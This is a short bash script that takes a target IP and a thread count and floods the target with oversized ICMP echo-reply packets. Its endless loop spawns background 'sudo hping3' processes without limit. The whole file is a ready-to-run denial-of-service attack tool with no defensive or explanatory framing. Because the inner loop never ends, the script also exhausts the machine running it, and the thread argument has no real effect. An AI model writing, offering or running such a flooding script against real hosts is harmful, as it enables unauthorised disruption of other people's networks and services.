#!/bin/bash
# arguments are ./script 10.10.10.10 100
if [ $# -lt 2 ]; then
    echo "Usage: $0 <target IP> <threads>"
    exit 1
fi

TARGET_IP=$1
THREADS=$2

for i in $(seq $THREADS); do
    while true; do
        sudo hping3 -d 65495 --icmp --icmptype 0 $TARGET_IP >/dev/null &
    done
done
